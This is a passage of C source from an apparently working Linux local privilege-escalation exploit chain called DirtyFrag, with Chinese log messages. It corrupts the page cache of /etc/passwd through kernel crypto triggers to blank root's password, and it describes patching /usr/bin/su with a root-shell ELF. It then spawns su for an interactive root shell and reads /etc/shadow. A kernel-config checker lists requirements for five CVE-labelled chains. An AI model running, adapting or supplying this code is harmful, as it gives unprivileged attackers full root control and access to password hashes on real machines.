	LOG("目标 %s 已只读打开, 大小=%lld uid=%u gid=%u mode=%04o",
			target_path, (long long)st.st_size, st.st_uid, st.st_gid,
			st.st_mode & 07777);

	/* mmap first page so the page-cache page stays pinned. */
	void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
	if (map == MAP_FAILED) { WARN("mmap 失败: %s", strerror(errno)); return 1; }
	LOG("已 mmap %s 页缓存 @ %p (PROT_READ|MAP_SHARED)", target_path, map);

	/* If a previous attempt already left the root entry in the patched
	 * "root::0:0:..." form, treat as success and skip the brute-force /
	 * trigger stages.  Otherwise proceed regardless of current state —
	 * the brute-force re-derives K_A/K_B/K_C from whatever bytes are
	 * currently at offsets 4/6/8 of the page-cache page, so it works
	 * even on the corrupt residue from a previous failed run. */
	{
		const char *m = (const char *)map;
		if (memcmp(m, "root::0:0", 9) == 0) {
			LOG("/etc/passwd 已被改写 (root::0:0...), 无需重复");
			return 0;
		}
		LOG("/etc/passwd 第一行前 16 字节:");
		for (int i = 0; i < 16; i++)
			fprintf(stderr, "%02x ", (uint8_t)m[i]);
		fprintf(stderr, "\n");
	}
	fprintf(stderr, "[*] /etc/passwd line 1 (root entry) BEFORE: '");
	for (int i = 0; i < 32; i++) {
		char c = ((const char *)map)[i];
		fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
	}
	fprintf(stderr, "'\n");

	/* === STAGE 1 — THREE-SPLICE OFFLINE BRUTE FORCE ===
	 *
	 * Read THREE 8-byte ciphertexts at file offsets 4, 6, 8.  Search
	 * independently for K_A (chars 4-5 = "::"), K_B (chars 6-7 = "0:"),
	 * K_C (chars 8-15 = "0:GGGGGG:" with G non-control).  All searches
	 * are user-space only — no kernel/VM interaction.
	 *
	 * Last-write-wins ordering: trigger A first (covers 4..11), then B
	 * (covers 6..13 — overrides A's 6..11), then C (covers 8..15 —
	 * overrides A's 8..11 and B's 8..13).  Final state of chars 4..15:
	 *   chars 4..5  = P_A[0..1]
	 *   chars 6..7  = P_B[0..1]
	 *   chars 8..15 = P_C[0..7]
	 * =================================================================*/
	uint8_t Ca[8], Cb[8], Cc[8];
	int off_a = 4, off_b = 6, off_c = 8;
	if (pread(rfd_ro, Ca, 8, off_a) != 8) { WARN("读取 Ca 失败: %s", strerror(errno)); return 1; }
	if (pread(rfd_ro, Cb, 8, off_b) != 8) { WARN("读取 Cb 失败: %s", strerror(errno)); return 1; }
	if (pread(rfd_ro, Cc, 8, off_c) != 8) { WARN("读取 Cc 失败: %s", strerror(errno)); return 1; }

	LOG("Ca @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
			off_a, Ca[0],Ca[1],Ca[2],Ca[3],Ca[4],Ca[5],Ca[6],Ca[7],
			(Ca[0]>=32&&Ca[0]<127)?Ca[0]:'.', (Ca[1]>=32&&Ca[1]<127)?Ca[1]:'.',
			(Ca[2]>=32&&Ca[2]<127)?Ca[2]:'.', (Ca[3]>=32&&Ca[3]<127)?Ca[3]:'.',
			(Ca[4]>=32&&Ca[4]<127)?Ca[4]:'.', (Ca[5]>=32&&Ca[5]<127)?Ca[5]:'.',
			(Ca[6]>=32&&Ca[6]<127)?Ca[6]:'.', (Ca[7]>=32&&Ca[7]<127)?Ca[7]:'.');
	LOG("Cb @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
			off_b, Cb[0],Cb[1],Cb[2],Cb[3],Cb[4],Cb[5],Cb[6],Cb[7],
			(Cb[0]>=32&&Cb[0]<127)?Cb[0]:'.', (Cb[1]>=32&&Cb[1]<127)?Cb[1]:'.',
			(Cb[2]>=32&&Cb[2]<127)?Cb[2]:'.', (Cb[3]>=32&&Cb[3]<127)?Cb[3]:'.',
			(Cb[4]>=32&&Cb[4]<127)?Cb[4]:'.', (Cb[5]>=32&&Cb[5]<127)?Cb[5]:'.',
			(Cb[6]>=32&&Cb[6]<127)?Cb[6]:'.', (Cb[7]>=32&&Cb[7]<127)?Cb[7]:'.');
	LOG("Cc @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
			off_c, Cc[0],Cc[1],Cc[2],Cc[3],Cc[4],Cc[5],Cc[6],Cc[7],
			(Cc[0]>=32&&Cc[0]<127)?Cc[0]:'.', (Cc[1]>=32&&Cc[1]<127)?Cc[1]:'.',
			(Cc[2]>=32&&Cc[2]<127)?Cc[2]:'.', (Cc[3]>=32&&Cc[3]<127)?Cc[3]:'.',
			(Cc[4]>=32&&Cc[4]<127)?Cc[4]:'.', (Cc[5]>=32&&Cc[5]<127)?Cc[5]:'.',
			(Cc[6]>=32&&Cc[6]<127)?Cc[6]:'.', (Cc[7]>=32&&Cc[7]<127)?Cc[7]:'.');

	fcrypt_init_sboxes();
	/* selftest */
	{
		fcrypt_uctx ctx;
		uint8_t z[8] = {0};
		uint8_t cv[8] = { 0x0E, 0x09, 0x00, 0xC7, 0x3E, 0xF7, 0xED, 0x41 };
		uint8_t pv[8];
		fcrypt_user_setkey(&ctx, z);
		fcrypt_user_decrypt(&ctx, pv, cv);
		if (memcmp(pv, z, 8) != 0) { WARN("fcrypt 自检失败"); return 1; }
	}
	LOG("fcrypt 自检通过");

	uint8_t Ka[8], Pa_out[8];
	uint8_t Kb[8], Pb_out[8];
	uint8_t Kc[8], Pc_out[8];
	uint8_t Cb_actual[8], Cc_actual[8];

	{
		uint64_t max_iters = 10000000000ULL;
		const char *e = getenv("LPE_MAX_ITERS");
		if (e) max_iters = strtoull(e, NULL, 0);
		uint64_t seed_base = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
		const char *se = getenv("LPE_SEED");
		if (se) seed_base = strtoull(se, NULL, 0);

		fprintf(stderr, "\n=== STAGE 1a: search K_A (chars 4-5 := \"::\")  prob ~1.5e-5 ===\n");
		if (find_K_offline_generic(Ca, max_iters, fc_check_pa_nullok,
					Ka, Pa_out, seed_base, "K_A") != 0) {
			WARN("K_A 搜索耗尽"); return 2;
		}

		/* After splice A is applied, the ciphertext that splice B will
		 * see at file offset 6 is NOT the original Cb — it's the bytes
		 * that splice A wrote to file offsets 6..11 (= Pa[2..7]) plus
		 * the original bytes 12..13 (= Cb[6..7]).  We must derive
		 * Cb_actual and search K_B against it. */
		memcpy(Cb_actual, Pa_out + 2, 6);
		memcpy(Cb_actual + 6, Cb + 6, 2);
		LOG("Cb_actual (after splice A) = %02x%02x%02x%02x%02x%02x%02x%02x",
				Cb_actual[0],Cb_actual[1],Cb_actual[2],Cb_actual[3],
				Cb_actual[4],Cb_actual[5],Cb_actual[6],Cb_actual[7]);

		fprintf(stderr, "\n=== STAGE 1b: search K_B (chars 6-7 := \"0:\")  prob ~1.5e-5 ===\n");
		if (find_K_offline_generic(Cb_actual, max_iters, fc_check_pb_nullok,
					Kb, Pb_out, seed_base ^ 0xa5a5a5a5a5a5a5a5ULL,
					"K_B") != 0) {
			WARN("K_B 搜索耗尽"); return 2;
		}

		/* Same chaining logic for splice C: after splice B, file offsets
		 * 8..13 hold Pb[2..7]; offsets 14..15 still hold the original
		 * bytes Cc[6..7]. */
		memcpy(Cc_actual, Pb_out + 2, 6);
		memcpy(Cc_actual + 6, Cc + 6, 2);
		LOG("Cc_actual (after splice B) = %02x%02x%02x%02x%02x%02x%02x%02x",
				Cc_actual[0],Cc_actual[1],Cc_actual[2],Cc_actual[3],
				Cc_actual[4],Cc_actual[5],Cc_actual[6],Cc_actual[7]);

		fprintf(stderr, "\n=== STAGE 1c: search K_C (chars 8-15 := \"0:GGGGGG:\")  prob ~5.4e-8 ===\n");
		if (find_K_offline_generic(Cc_actual, max_iters, fc_check_pc_nullok,
					Kc, Pc_out, seed_base ^ 0x5a5a5a5a5a5a5a5aULL,
					"K_C") != 0) {
			WARN("K_C 搜索耗尽"); return 2;
		}
	}

	fprintf(stderr, "\n[+] Predicted post-corruption /etc/passwd line 1:\n    \"root");
	/* chars 4-5 from P_A */
	for (int i = 0; i < 2; i++) fputc((Pa_out[i]>=32&&Pa_out[i]<127)?Pa_out[i]:'.', stderr);
	/* chars 6-7 from P_B */
	for (int i = 0; i < 2; i++) fputc((Pb_out[i]>=32&&Pb_out[i]<127)?Pb_out[i]:'.', stderr);
	/* chars 8-15 from P_C */
	for (int i = 0; i < 8; i++) fputc((Pc_out[i]>=32&&Pc_out[i]<127)?Pc_out[i]:'.', stderr);
	fprintf(stderr, "/root:/bin/bash\"\n");

	/* === STAGE 2 — THREE KERNEL TRIGGERS (in order A → B → C) ===
	 * Each trigger does a single in-place decrypt at the
	 * indicated /etc/passwd file offset.  Last-write-wins on overlapping
	 * bytes determines the final state.
	 */
	fprintf(stderr, "\n=== STAGE 2a: kernel trigger A @ off %d (set chars 4-5 \"::\") ===\n", off_a);
	memcpy(SESSION_KEY, Ka, 8);
	if (do_one_trigger(rfd_ro, off_a, 8) < 0) {
		WARN("内核触发 A 失败"); return 3;
	}

	fprintf(stderr, "\n=== STAGE 2b: kernel trigger B @ off %d (set chars 6-7 \"0:\") ===\n", off_b);
	memcpy(SESSION_KEY, Kb, 8);
	if (do_one_trigger(rfd_ro, off_b, 8) < 0) {
		WARN("内核触发 B 失败"); return 3;
	}

	fprintf(stderr, "\n=== STAGE 2c: kernel trigger C @ off %d (set chars 8-15 \"0:GGGGGG:\") ===\n", off_c);
	memcpy(SESSION_KEY, Kc, 8);
	if (do_one_trigger(rfd_ro, off_c, 8) < 0) {
		WARN("内核触发 C 失败"); return 3;
	}

	/* Verify: re-read line 1 of /etc/passwd via mmap. */
	fprintf(stderr, "[*] /etc/passwd line 1 (root entry) AFTER:  '");
	for (int i = 0; i < 32; i++) {
		char c = ((const char *)map)[i];
		fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
	}
	fprintf(stderr, "'\n");

	/* Sanity-check: chars 4-5 = "::", 6-7 = "0:", 8-9 = "0:", 15 = ':'. */
	{
		const char *m = (const char *)map;
		int ok = (m[4] == ':' && m[5] == ':' &&
				m[6] == '0' && m[7] == ':' &&
				m[8] == '0' && m[9] == ':' &&
				m[15] == ':');
		if (!ok) {
			WARN("触发后校验失败 — 字符布局不符");
			return 4;
		}
	}
	fprintf(stderr,
			"\n[!!!] 命中 — root 条目密码字段已为空, uid=0, "
			"gid=0, dir=/root, shell=/bin/bash.\n");

	/* === STAGE 3 — VERIFY VIA getent passwd root === */
	fprintf(stderr,
			"\n=== 阶段 3: 用 `getent passwd root` 独立验证 ===\n");
	{
		int p[2];
		if (pipe(p) == 0) {
			pid_t pid = fork();
			if (pid == 0) {
				close(p[0]);
				dup2(p[1], 1);
				dup2(p[1], 2);
				close(p[1]);
				execlp("getent", "getent", "passwd", "root", NULL);
				_exit(127);
			}
			close(p[1]);
			char buf[1024];
			ssize_t r = read(p[0], buf, sizeof(buf) - 1);
			close(p[0]);
			int wstatus = 0;
			waitpid(pid, &wstatus, 0);
			if (r > 0) {
				buf[r] = 0;
				fprintf(stderr, "[getent passwd root] %s", buf);
			}
			fprintf(stderr,
					"[+] 原语已验证: root 条目的密码字段为空 "
					"via NSS.\n");
		}
	}

	/* Honour `--corrupt-only` arg or DIRTYFRAG_CORRUPT_ONLY=1 env so
	 * the chain wrapper can skip the in-process su PTY stage and exec
	 * /usr/bin/su itself.  Avoids the flaky posix_openpt bridge. */
	{
		int co_flag = 0;
		for (int i = 1; i < argc; i++)
			if (!strcmp(argv[i], "--corrupt-only")) { co_flag = 1; break; }
		const char *e = getenv("DIRTYFRAG_CORRUPT_ONLY");
		if (e && *e == '1') co_flag = 1;
		if (co_flag) return 0;
	}

	/* === STAGE 4 — `su` (target=root, no password input) ===
	 * PAM common-auth contains "auth [success=2 default=ignore]
	 * pam_unix.so nullok" — so a target user with empty passwd field
	 * + nullok flag accepts an empty password.  We auto-inject a
	 * single newline on the "Password:" prompt and then bridge the
	 * resulting bash to the user's tty. */
	fprintf(stderr,
			"\n=== 阶段 4: 通过 `su` 启动交互式 root shell "
			"(no password input needed) ===\n\n");
	fflush(stderr);

	int master = posix_openpt(O_RDWR | O_NOCTTY);
	if (master < 0 || grantpt(master) < 0 || unlockpt(master) < 0) {
		WARN("posix_openpt 失败: %s", strerror(errno));
		return 5;
	}
	char *slave_name = ptsname(master);

	struct winsize ws;
	if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0) {
		ioctl(master, TIOCSWINSZ, &ws);
	}

	pid_t pid = fork();
	if (pid < 0) { WARN("fork 失败: %s", strerror(errno)); return 5; }
	if (pid == 0) {
		/* child */
		setsid();
		int slave = open(slave_name, O_RDWR);
		if (slave < 0) _exit(127);
		ioctl(slave, TIOCSCTTY, 0);
		dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
		if (slave > 2) close(slave);
		close(master);
		/* `su` with no args targets root.  PAM common-auth's pam_unix.so
		 * nullok accepts the empty passwd we planted in /etc/passwd. */
		execlp("su", "su", NULL);
		_exit(127);
	}

	/* parent: bridge user's tty <-> master. */
	struct termios saved_termios;
	int saved_termios_ok = (tcgetattr(STDIN_FILENO, &saved_termios) == 0);
	if (saved_termios_ok) {
		struct termios raw = saved_termios;
		cfmakeraw(&raw);
		tcsetattr(STDIN_FILENO, TCSANOW, &raw);
	}

	int auto_pw_sent = 0;
	int stdin_eof = 0;          /* set when stdin closes (e.g. /dev/null) */
	char buf[4096];
	/* If LPE_AUTO_VERIFY=1 is set, the bridge will inject
	 * `id; whoami; exit\n` so it can prove uid=0 non-interactively
	 * (e.g. when stdin is /dev/null in CI). */
	int auto_verify = 0;
	{
		const char *e = getenv("LPE_AUTO_VERIFY");
		if (e && *e == '1') auto_verify = 1;
	}
	int verify_sent = 0;
	int total_ms = 0;
	for (;;) {
		struct pollfd pfds[2] = {
			{ stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
			{ master,       POLLIN, 0 },
		};
		int pr = poll(pfds, 2, 200);
		if (pr < 0 && errno != EINTR) break;
		total_ms += 200;

		if (pfds[1].revents & POLLIN) {
			ssize_t n = read(master, buf, sizeof(buf));
			if (n <= 0) break;
			(void)write(STDOUT_FILENO, buf, n);
			if (!auto_pw_sent && (size_t)n < sizeof(buf)) {
				buf[n] = 0;
				if (strstr(buf, "Password") || strstr(buf, "password")) {
					/* Empty password — PAM nullok will accept it.
					 * (When pam_unix sees an empty passwd field plus
					 * nullok it skips the prompt entirely; this branch
					 * handles the case where some other PAM module
					 * prints a prompt anyway.) */
					(void)write(master, "\n", 1);
					auto_pw_sent = 1;
				}
			}
		}
		if (!stdin_eof && (pfds[0].revents & POLLIN)) {
			ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
			if (n <= 0) {
				/* stdin EOF — stop reading from it but keep bridging
				 * master → stdout so su can still finish auth and run
				 * the optional auto-verify command. */
				stdin_eof = 1;
			} else {
				(void)write(master, buf, n);
			}
		}
		if (pfds[1].revents & (POLLHUP | POLLERR)) break;

		/* Auto-verify: ~1 s after spawn, send `id; whoami; exit\n` so
		 * the bridge captures uid=0 evidence non-interactively even
		 * when pam_unix's blank-passwd path skips the prompt. */
		if (auto_verify && !verify_sent && total_ms >= 1000) {
			const char cmd[] = "id; whoami; cat /etc/shadow | head -2; exit\n";
			(void)write(master, cmd, sizeof(cmd) - 1);
			verify_sent = 1;
		}

		int status;
		pid_t w = waitpid(pid, &status, WNOHANG);
		if (w == pid) {
			for (int i = 0; i < 5; i++) {
				struct pollfd pf = { master, POLLIN, 0 };
				if (poll(&pf, 1, 50) <= 0) break;
				ssize_t n = read(master, buf, sizeof(buf));
				if (n <= 0) break;
				(void)write(STDOUT_FILENO, buf, n);
			}
			break;
		}
	}
	if (saved_termios_ok) {
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
	}
	close(master);
	return 0;
}
/*
 * DirtyFrag chain — uid=1000 → root.
 *
 * 1. ESP path  (authencesn AF_ALG --corrupt-only): overwrites the first
 *    160 bytes of /usr/bin/su's page-cache with a static x86_64 root-
 *    shell ELF.  Works on every distro tested regardless of PAM nullok
 *    or /etc/passwd contents — once invoked, the patched setuid-root
 *    /usr/bin/su just execs /bin/sh as uid 0.
 *
 * 2. rxrpc path  (Ubuntu fallback): if AF_ALG is sandboxed and the ESP
 *    path can't reach the page cache, fall back to the rxrpc/rxkad
 *    nullok primitive that patches /etc/passwd's root entry empty.
 *    PAM nullok then accepts the empty password during `su -`.
 *
 * 3. Once either target is corrupted, spawn `/usr/bin/su -` inside a
 *    fresh PTY and bridge the user's tty to it.  The bridge handles
 *    both the patched-su (no PAM at all) and the patched-passwd (PAM
 *    nullok) cases uniformly, and works even when the caller is in a
 *    background process group of an ssh-allocated PTY.
 *
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <poll.h>
#include <signal.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdint.h>

extern int su_lpe_main(int argc, char **argv);
extern int rxrpc_lpe_main(int argc, char **argv);

/*
 * The 8 bytes our su payload places at file offset 0x78 — the first
 * instructions of the embedded shell ELF.  Sequence:
 *   31 ff   xor edi, edi
 *   31 f6   xor esi, esi
 *   31 c0   xor eax, eax
 *   b0 6a   mov al, 0x6a   (setgid)
 * Distros' original /usr/bin/su has different bytes here, so this is
 * a reliable post-patch marker.
 *
 * (We don't check offset 0 because /usr/bin/su already has the ELF
 * magic there — both before and after we patch.)
 */
static const uint8_t su_marker[8] = {
	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
};

static int su_already_patched(void)
{
	int fd = open("/usr/bin/su", O_RDONLY);
	if (fd < 0)
		return 0;
	uint8_t got[8];
	ssize_t n = pread(fd, got, sizeof(got), 0x78);
	close(fd);
	if (n != sizeof(got))
		return 0;
	return memcmp(got, su_marker, sizeof(su_marker)) == 0;
}

static int passwd_already_patched(void)
{
	int fd = open("/etc/passwd", O_RDONLY);
	if (fd < 0)
		return 0;
	char head[16];
	ssize_t n = pread(fd, head, sizeof(head), 0);
	close(fd);
	if (n < 9)
		return 0;
	return memcmp(head, "root::0:0", 9) == 0;
}

static int either_target_patched(void)
{
	return su_already_patched() || passwd_already_patched();
}

static char **append_corrupt_only(int argc, char **argv, int *new_argc)
{
	static char *flag = "--corrupt-only";
	static char *buf[64];
	int n = argc < 60 ? argc : 60;
	for (int i = 0; i < n; i++)
		buf[i] = argv[i];
	buf[n] = flag;
	buf[n + 1] = NULL;
	*new_argc = n + 1;
	return buf;
}

static void exec_su_login(void)
{
	const char *paths[] = {
		"/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
	};
	for (int i = 0; paths[i]; i++)
		execl(paths[i], "su", "-", (char *)NULL);
	execlp("su", "su", "-", (char *)NULL);
}

/*
 * Spawn `/usr/bin/su -` in a fresh PTY and bridge our tty to it.
 */
static int run_root_pty(void)
{
	int master = posix_openpt(O_RDWR | O_NOCTTY);
	if (master < 0)
		return -1;
	if (grantpt(master) < 0 || unlockpt(master) < 0) {
		close(master);
		return -1;
	}
	char *slave_name = ptsname(master);
	if (!slave_name) {
		close(master);
		return -1;
	}

	struct winsize ws;
	if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0)
		ioctl(master, TIOCSWINSZ, &ws);

	pid_t pid = fork();
	if (pid < 0) {
		close(master);
		return -1;
	}
	if (pid == 0) {
		setsid();
		int slave = open(slave_name, O_RDWR);
		if (slave < 0)
			_exit(127);
		ioctl(slave, TIOCSCTTY, 0);
		dup2(slave, 0);
		dup2(slave, 1);
		dup2(slave, 2);
		if (slave > 2)
			close(slave);
		close(master);
		exec_su_login();
		_exit(127);
	}

	signal(SIGTTOU, SIG_IGN);
	signal(SIGTTIN, SIG_IGN);
	signal(SIGPIPE, SIG_IGN);
	signal(SIGHUP,  SIG_IGN);
	(void)setpgid(0, 0);
	(void)tcsetpgrp(STDIN_FILENO, getpid());

	struct termios saved_termios;
	int restore_termios = 0;
	if (tcgetattr(STDIN_FILENO, &saved_termios) == 0) {
		struct termios raw = saved_termios;
		cfmakeraw(&raw);
		if (tcsetattr(STDIN_FILENO, TCSANOW, &raw) == 0)
			restore_termios = 1;
	}

	int auto_pw_sent = 0;
	int stdin_eof = 0;
	int saw_master_output = 0;
	int total_ms = 0;
	char buf[4096];

	for (;;) {
		struct pollfd pfds[2] = {
			{ stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
			{ master,                        POLLIN, 0 },
		};
		int pr = poll(pfds, 2, 200);
		if (pr < 0 && errno != EINTR)
			break;
		total_ms += 200;

		if (pfds[1].revents & POLLIN) {
			ssize_t n = read(master, buf, sizeof(buf));
			if (n <= 0)
				break;
			saw_master_output = 1;
			(void)write(STDOUT_FILENO, buf, n);
			if (!auto_pw_sent && n < (ssize_t)sizeof(buf)) {
				buf[n] = 0;
				if (strstr(buf, "Password") ||
						strstr(buf, "password")) {
					(void)write(master, "\n", 1);
					auto_pw_sent = 1;
				}
			}
		}
		if (!stdin_eof && (pfds[0].revents & POLLIN)) {
			ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
			if (n <= 0)
				stdin_eof = 1;
			else
				(void)write(master, buf, n);
		}
		if (pfds[1].revents & (POLLHUP | POLLERR))
			break;

		if (!auto_pw_sent && !saw_master_output && total_ms >= 1500) {
			(void)write(master, "\n", 1);
			auto_pw_sent = 1;
		}

		int status;
		pid_t w = waitpid(pid, &status, WNOHANG);
		if (w == pid) {
			for (int i = 0; i < 5; i++) {
				struct pollfd pf = { master, POLLIN, 0 };
				if (poll(&pf, 1, 50) <= 0)
					break;
				ssize_t n = read(master, buf, sizeof(buf));
				if (n <= 0)
					break;
				(void)write(STDOUT_FILENO, buf, n);
			}
			break;
		}
	}

	if (restore_termios)
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
	close(master);
	return 0;
}

/* ===================== 移植模块: 检测 / 扫描 / 备份 ===================== */
/* lpe 主文件用 CLR_GRN 等短名, 这里补齐 dirtyfrag.c 风格的宏 */
#define CLR_RED    "\033[31m"
#define CLR_GREEN  "\033[32m"
#define CLR_YELLOW "\033[33m"
#define CLR_CYAN   "\033[36m"

/* 配置项归属: 哪条 CVE 链需要它 (位掩码) */
#define CHAIN_ESP     0x1   /* CVE-2026-43284  XFRM/ESP   */
#define CHAIN_RXRPC   0x2   /* CVE-2026-43500  RxRPC      */
#define CHAIN_COPY    0x4   /* CVE-2026-31431  AF_ALG AEAD */
#define CHAIN_UAF     0x8   /* CVE-2026-43494  io_uring + RDS 页引用计数劫持 */
#define CHAIN_PEDIT   0x10  /* CVE-2026-46331  net/sched act_pedit */
#define CHAIN_BOTH    0x1F  /* 五条链共用 */

struct cfg_req {
	const char *name;
	int required;   /* 1 = 必须 y/m 才过; 0 = 建议/诊断 */
	const char *modname;  /* 若为 m, 对应的内核模块名; NULL = 非模块 */
	int chain;      /* 位掩码: CHAIN_ESP / CHAIN_RXRPC / CHAIN_COPY / CHAIN_BOTH */
	const char *desc;
};

static const struct cfg_req g_cfg_reqs[] = {
	/* ---- 各条链共用 ---- */
	{"CONFIG_NET",           1, NULL, CHAIN_ESP | CHAIN_RXRPC | CHAIN_PEDIT, "网络子系统"},
	{"CONFIG_INET",          1, NULL, CHAIN_ESP | CHAIN_RXRPC,  "IPv4 协议栈"},
	/* ---- CVE-2026-43284: XFRM / ESP ---- */
	{"CONFIG_XFRM",          1, NULL, CHAIN_ESP,   "XFRM 框架 (xfrm_input / esp4)"},
	{"CONFIG_INET_ESP",      1, "esp4",    CHAIN_ESP, "ESP 协议 (esp_input 漏洞点)"},
	{"CONFIG_USER_NS",       1, NULL,      CHAIN_ESP | CHAIN_PEDIT, "非特权 userns 拿 CAP_NET_ADMIN"},
	/* ---- CVE-2026-43500: RxRPC / RXKAD ---- */
	{"CONFIG_AF_RXRPC",      1, "rxrpc",   CHAIN_RXRPC, "AF_RXRPC 协议族 (rxkad_verify_packet 漏洞点)"},
	{"CONFIG_RXKAD",         1, "rxkad",   CHAIN_RXRPC, "rxkad 安全类 (8 字节 pcbc(fcrypt) 原地解密)"},
	{"CONFIG_CRYPTO_PCBC",   1, "pcbc",    CHAIN_RXRPC, "pcbc 分组模式 (rxkad 用它解密)"},
	{"CONFIG_CRYPTO_FCRYPT", 1, "fcrypt",  CHAIN_RXRPC, "fcrypt 算法 (rxkad 会话密钥)"},
	{"CONFIG_CRYPTO_USER_API_SKCIPHER", 1, "algif_skcipher", CHAIN_RXRPC,
	 "AF_ALG skcipher (用户态算 csum_iv / 构造 DATA 包)"},
	{"CONFIG_AF_RXRPC_IPV4", 0, NULL,      CHAIN_RXRPC, "rxrpc IPv4 transport (5.x 常无独立项, 以实测为准)"},
	/* ---- CVE-2026-31431: AF_ALG algif_aead ---- */
	{"CONFIG_NET_SCH_PEDIT", 1, "act_pedit", CHAIN_PEDIT, "pedit 动作 (漏洞点 skb_store_bits)"},
	{"CONFIG_NET_CLS_ACT",   1, NULL,      CHAIN_PEDIT, "tc 动作框架"},
	{"CONFIG_NET_SCH_INGRESS",1,"sch_ingress",CHAIN_PEDIT,"clsact qdisc"},
	{"CONFIG_NET_CLS_BASIC", 0, "cls_basic", CHAIN_PEDIT, "basic 分类器 (缺失则回退 matchall)"},
	{"CONFIG_NET_EMATCH_META",0,"em_meta",  CHAIN_PEDIT, "pkt_len 匹配 (缺失则回退 matchall)"},
	{"CONFIG_NET_CLS_MATCHALL",0,"cls_matchall",CHAIN_PEDIT,"matchall 分类器 (回退方案)"},
	{"CONFIG_IO_URING",      1, NULL,      CHAIN_UAF,  "io_uring (缓冲区注册 + READ_FIXED)"},
	{"CONFIG_RDS",           1, "rds",     CHAIN_UAF,  "RDS 协议族 (zerocopy 偷引用)"},
	{"CONFIG_RDS_TCP",       1, "rds_tcp", CHAIN_UAF,  "RDS over TCP transport"},
	{"CONFIG_CRYPTO_USER_API_AEAD", 1, "algif_aead", CHAIN_COPY,
	 "AF_ALG AEAD 用户态接口 (漏洞入口, 缺此项不可利用)"},
	/* ---- ESP 与 Copy Fail 共用 ---- */
	{"CONFIG_CRYPTO_AUTHENC",1, "authencesn", CHAIN_ESP | CHAIN_COPY,
	 "authencesn (assoclen+cryptlen 处 4 字节 STORE)"},
	{"CONFIG_CRYPTO_AES",    1, "aes",     CHAIN_ESP | CHAIN_COPY, "cbc(aes) 对称算法"},
	{"CONFIG_CRYPTO_CBC",    1, "cbc",     CHAIN_ESP | CHAIN_COPY, "CBC 分组模式"},
	{"CONFIG_CRYPTO_HMAC",   1, "hmac",    CHAIN_ESP | CHAIN_COPY, "hmac 摘要算法"},
	{"CONFIG_CRYPTO_SHA256", 1, "sha256",  CHAIN_ESP | CHAIN_COPY, "hmac(sha256) 完整性算法"},
	/* ---- 诊断项 ---- */
	{"CONFIG_SPLICE",        0, NULL,      CHAIN_BOTH, "splice 写原语: 5.x 内核 syscall 通常无条件提供, 本机 config 未列出属正常, 实际可用性请以实测为准"},
	{"CONFIG_INET_UDP_DIAG", 0, "udp_diag",CHAIN_BOTH, "UDP diag: 仅文档列出, 本 exp 未实际使用 (非必须)"},
	{NULL, 0, NULL, 0, NULL}
};

/* 0 = 三条链都查; 否则为 CHAIN_* 单值 */
static int g_cfg_chain = 0;
static void uaf_probe(void);   /* 运行时能力探测, 定义在第四条链模块里 */

static int cfg_wanted(const struct cfg_req *r)
{
	if (g_cfg_chain == 0)
		return 1;
	return (r->chain & g_cfg_chain) != 0;
}

#define SCAN_MIN_SIZE   1024   /* 粗判下限: 小于此值放不下内置 payload */
#define SCAN_MAX_DEPTH  64

static int g_scan_total;
static int g_scan_usable;

#define MAX_MNTS 256

struct mnt_ent {
	char dir[PATH_MAX];
	char fstype[64];
	int nosuid;
	int ro;
};

static struct mnt_ent g_mnts[MAX_MNTS];
static int g_nmnts;

static long long now_ms(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void pmsg(const char *fmt, ...)
{
	char buf[2048];
	const char *color = NULL;
	va_list ap;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);

	if (!color_enabled()) {
		fputs(buf, stdout);
		fflush(stdout);
		return;
	}

	if (!strncmp(buf, "[+]", 3))
		color = CLR_GREEN;
	else if (!strncmp(buf, "[-]", 3))
		color = CLR_RED;
	else if (!strncmp(buf, "[!]", 3))
		color = CLR_YELLOW;
	else if (!strncmp(buf, "[*]", 3))
		color = CLR_CYAN;

	if (color)
		fprintf(stdout, "%s%s%s", color, buf, CLR_RST);
	else
		fputs(buf, stdout);
}

static const char *find_config(char *buf, size_t sz)
{
	struct utsname ut;
	char cands[5][384];
	int n = 0, i;

	if (uname(&ut) < 0)
		return NULL;
	snprintf(cands[n++], sizeof(cands[0]), "/proc/config.gz");
	snprintf(cands[n++], sizeof(cands[0]), "/boot/config-%s", ut.release);
	snprintf(cands[n++], sizeof(cands[0]),
		 "/lib/modules/%s/build/.config", ut.release);
	snprintf(cands[n++], sizeof(cands[0]),
		 "/usr/src/linux-headers-%s/.config", ut.release);
	snprintf(cands[n++], sizeof(cands[0]),
		 "/usr/lib/modules/%s/build/.config", ut.release);

	for (i = 0; i < n; i++) {
		struct stat st;

		if (stat(cands[i], &st) == 0) {
			size_t l = strlen(cands[i]);

			if (l >= sz)
				l = sz - 1;
			memcpy(buf, cands[i], l);
			buf[l] = '\0';
			return buf;
		}
	}
	return NULL;
}

static FILE *open_config(const char *path)
{
	if (strstr(path, ".gz")) {
		char cmd[1536];

